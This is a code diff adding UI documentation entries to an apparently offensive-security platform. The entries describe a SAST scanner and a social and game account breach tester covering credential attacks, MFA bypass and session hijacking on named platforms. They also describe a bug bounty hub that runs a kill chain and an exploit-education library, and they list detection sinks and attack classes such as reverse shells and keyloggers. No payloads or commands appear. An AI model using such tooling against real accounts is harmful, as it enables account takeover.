+          <li><span className="text-primary/30">5.</span> Use the message input to send frames, or enable <strong>Auto-Fuzz</strong> to run the payload library automatically.</li>
+        </ol>
+        <Note type="info">Arsenal-tier tool. WebSocket testing is frequently missed in security assessments — most scanners don't handle ws:// traffic. CSWSH is especially common in chat/gaming applications.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "sast-tool",
+    title: "SAST — Static Application Security Testing",
+    icon: ScanSearch,
+    content: (
+      <div className="space-y-3">
+        <p><strong>SAST Analyzer</strong> (<code>/sast</code>) scans application source code for security vulnerabilities without executing it — identifying injection flaws, hardcoded secrets, insecure crypto, and dangerous function usage directly from the code.</p>
+        <h4 className="font-bold text-primary text-[11px]">Supported Languages</h4>
+        <div className="grid grid-cols-3 gap-1.5">
+          {["JavaScript / TypeScript", "Python", "Java", "PHP", "Go", "Ruby", "C / C++", "C#", "Kotlin", "Swift", "Rust", "Bash / Shell"].map(l => (
+            <div key={l} className="text-[9px] font-mono text-primary/75 border border-primary/10 rounded px-2 py-1 text-center">{l}</div>
+          ))}
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">Detection Rules</h4>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>Injection sinks</strong>: eval(), exec(), system(), popen(), innerHTML, document.write, dangerous ORM raw query usage</div>
+          <div>• <strong>Hardcoded secrets</strong>: API keys, passwords, private keys in source code and config files</div>
+          <div>• <strong>Insecure cryptography</strong>: MD5/SHA1 for password hashing, ECB mode AES, weak PRNG (Math.random()), short RSA keys</div>
+          <div>• <strong>SQL injection</strong>: string concatenation in DB queries, format string in SQL, ORM bypass patterns</div>
+          <div>• <strong>XSS sources→sinks</strong>: traces user input from request.params to innerHTML/dangerouslySetInnerHTML</div>
+          <div>• <strong>Deserialization</strong>: pickle.loads, ObjectInputStream, JSON.parse with prototype pollution</div>
+          <div>• <strong>Path traversal</strong>: user input in file paths without canonicalization</div>
+          <div>• <strong>SSRF</strong>: URL fetching functions with user-controlled input</div>
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>SAST Analyzer</strong> (<code>/sast</code>).</li>
+          <li><span className="text-primary/30">2.</span> Upload a zip of your source code, paste a single file, or enter a public GitHub repository URL.</li>
+          <li><span className="text-primary/30">3.</span> Click <strong>Scan</strong>. Findings include file path, line number, vulnerable code snippet, and remediation guidance.</li>
+          <li><span className="text-primary/30">4.</span> Filter findings by severity or rule category. Export full report as Markdown.</li>
+        </ol>
+        <Note type="info">Strike-tier tool. SAST is most effective on code you own — pair it with Dependency Scanner for complete application security coverage.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "social-breach",
+    title: "Social & Game Account Breach Tester",
+    icon: Globe2,
+    content: (
+      <div className="space-y-3">
+        <p><strong>Social &amp; Game Breach Tester</strong> (<code>/social-breach</code>) is an authorized security testing tool for verifying the resilience of social media and gaming platform accounts against credential attacks, session hijacking, and API abuse — for use only on accounts you own or have explicit written authorization to test.</p>
+        <h4 className="font-bold text-primary text-[11px]">Platform Coverage (19 programs)</h4>
+        <div className="grid grid-cols-2 gap-1.5">
+          {["PlayStation Network", "Xbox Live / Microsoft", "Steam / Valve", "Epic Games (Fortnite)", "Meta (Instagram/Facebook)", "Twitter / X", "Discord", "Reddit", "GitHub", "Google / YouTube", "Roblox", "Riot Games (LoL)", "Activision (CoD/Bliz)", "EA Sports / Origin", "Twitch", "TikTok", "Snapchat", "LinkedIn", "Apple ID"].map(p => (
+            <div key={p} className="text-[9px] font-mono text-primary/75 border border-primary/10 rounded px-2 py-1">{p}</div>
+          ))}
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">Test Categories</h4>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>Password policy test</strong>: Submit weak passwords and test enforcement (min length, complexity, breached password check)</div>
+          <div>• <strong>Rate limiting</strong>: Test login endpoint lockout behavior (attempts before lockout, lockout duration, IP vs account-based)</div>
+          <div>• <strong>MFA bypass</strong>: Test backup code enumeration, SMS SIM-swap scenarios, TOTP window tolerance</div>
+          <div>• <strong>Session management</strong>: Test session invalidation on password change, concurrent session limits, session fixation</div>
+          <div>• <strong>OAuth flows</strong>: Test redirect_uri validation, state parameter CSRF protection, PKCE enforcement</div>
+        </div>
+        <Note type="warn">Strike-tier tool. ONLY test accounts you own or have explicit written authorization to test. Unauthorized testing violates the CFAA, Computer Misuse Act, and platform terms of service. Include your test platform, scope, and authorization in all test configurations.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "bug-bounty-hub",
+    title: "Bug Bounty Hub",
+    icon: Bug,
+    content: (
+      <div className="space-y-3">
+        <p><strong>Bug Bounty Hub</strong> (<code>/bug-bounty</code>) is a centralized reference center and tooling integration for 19 major bug bounty programs. It combines program scope data, one-click tool launch, and a HackerOne-format report generator.</p>
+        <h4 className="font-bold text-primary text-[11px]">Program Cards</h4>
+        <p className="text-[10px] font-mono text-primary/83">Each program card shows: scope (in-scope domains and assets), out-of-scope list, payout table by severity (Critical/High/Medium/Low/Info), program platform (HackerOne, Bugcrowd, MSRC, Google VRP, Intigriti), and a direct link to the official program page.</p>
+        <h4 className="font-bold text-primary text-[11px] mt-3">Tool Integration</h4>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>Launch in OmniStrike</strong>: Opens OmniStrike pre-configured with the program's primary target domain.</div>
+          <div>• <strong>Launch in OSINT Recon</strong>: Pre-fills the target domain in OSINT Recon for passive recon.</div>
+          <div>• <strong>Launch in Subdomain Scout</strong>: Starts subdomain enumeration across all 9 passive sources for the target.</div>
+          <div>• <strong>Launch in Ghost Chain</strong>: Runs the 5-stage kill chain pipeline against the target.</div>
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">Report Generator</h4>
+        <p className="text-[10px] font-mono text-primary/83">Fills in a standard HackerOne/Bugcrowd vulnerability disclosure report format. Select the severity, enter your finding details, and copy the formatted report ready for submission. Covers: Summary, Steps to Reproduce, Impact, Remediation, CVSS score.</p>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>Bug Bounty Hub</strong> (<code>/bug-bounty</code>).</li>
+          <li><span className="text-primary/30">2.</span> Filter by platform or payout range to find programs matching your expertise.</li>
+          <li><span className="text-primary/30">3.</span> Click a program card to expand scope, payout table, and tool launch buttons.</li>
+          <li><span className="text-primary/30">4.</span> Register with the program on their official platform before any testing.</li>
+          <li><span className="text-primary/30">5.</span> Click <strong>Launch in OmniStrike</strong> to start automated testing within the defined scope.</li>
+          <li><span className="text-primary/30">6.</span> When you find a vulnerability, use the <strong>Report Generator</strong> to format your disclosure.</li>
+        </ol>
+        <Note type="warn">Strike-tier tool. Always register with the bug bounty program before testing. Never test assets outside the defined scope. Unauthorized testing voids bounty eligibility and may result in legal action.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "hackanon-guide",
+    title: "HackAnon — Exploit Education",
+    icon: ScanSearch,
+    content: (
+      <div className="space-y-3">
+        <p><strong>HackAnon</strong> (<code>/hackanon</code>) is an interactive exploit education library covering 15+ major vulnerability classes with step-by-step hacker methodology, detection indicators, and defense recommendations — designed for developers and security researchers.</p>
+        <h4 className="font-bold text-primary text-[11px]">Covered Exploit Classes</h4>
+        <div className="grid grid-cols-2 gap-1.5">
+          {[
+            "SQL Injection (error, blind, UNION, time-based, auth-bypass)",
+            "Cross-Site Scripting — XSS (reflected, stored, DOM, keylogger)",
+            "Remote Code Execution (command injection, reverse shell, Log4Shell)",
+            "SSRF (cloud metadata, internal services, bypass techniques)",
+            "LFI / Path Traversal (log poisoning → RCE)",
+            "IDOR — Insecure Direct Object Reference (enumeration, mass takeover)",
+            "JWT Attacks (alg:none, HS256↔RS256, kid injection, claim escalation)",
+            "XXE — XML External Entity (file read, SSRF, OOB exfil)",
+            "CSRF (form, JSON, SameSite bypass)",
+            "SSTI — Server-Side Template Injection (Jinja2, Twig RCE)",
+            "Deserialization (Java ysoserial, PHP, Python pickle RCE)",
+            "Subdomain Takeover (GitHub Pages, S3, Heroku)",
+            "WAF Bypass (encoding, obfuscation, chunked transfer, path confusion)",
+            "Passive OSINT Recon (DNS, CT logs, Shodan, GitHub secrets)",
+            "Credential Stuffing & Password Spraying",
+          ].map(e => <div key={e} className="text-[9px] font-mono text-primary/75 border border-primary/10 rounded px-2 py-1">{e}</div>)}
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">What Each Entry Contains</h4>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>How It Works</strong>: Technical explanation of the vulnerability mechanism</div>
+          <div>• <strong>Step-by-Step Attack</strong>: Numbered walkthrough with exact commands an attacker would use</div>
+          <div>• <strong>Detection Indicators</strong>: How to detect this attack in your logs and monitoring</div>
+          <div>• <strong>Defense Recommendations</strong>: Specific code changes and configurations to prevent the vulnerability</div>
+          <div>• <strong>Platform Tool Link</strong>: Direct link to the relevant ProxhqVPN tool to test each class on authorized targets</div>
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>HackAnon</strong> (<code>/hackanon</code>).</li>
+          <li><span className="text-primary/30">2.</span> Browse the sidebar or use the search to find a vulnerability class.</li>
+          <li><span className="text-primary/30">3.</span> Filter by category (Injection, Authentication, Server-Side, etc.) or severity.</li>
+          <li><span className="text-primary/30">4.</span> Read the How It Works section, then follow the step-by-step attack to understand the exploit chain.</li>
+          <li><span className="text-primary/30">5.</span> Click the green <strong>Test with [Tool Name]</strong> button to launch the relevant ProxhqVPN tool against an authorized target.</li>
+          <li><span className="text-primary/30">6.</span> Use the Detection and Defense sections to harden your own applications.</li>
+        </ol>
+        <Note type="danger">HackAnon is for educational purposes and authorized penetration testing only. Never use these techniques on systems without explicit written permission. Unauthorized attacks are illegal under the CFAA, Computer Misuse Act, and equivalent laws worldwide. ALPHA UNLIMITED TECHNOLOGIES LLC is not liable for misuse.</Note>
+      </div>
+    ),
+  },
+  {
     id: "manuals-download",
     title: "Manuals Download Center",
     icon: FileText,
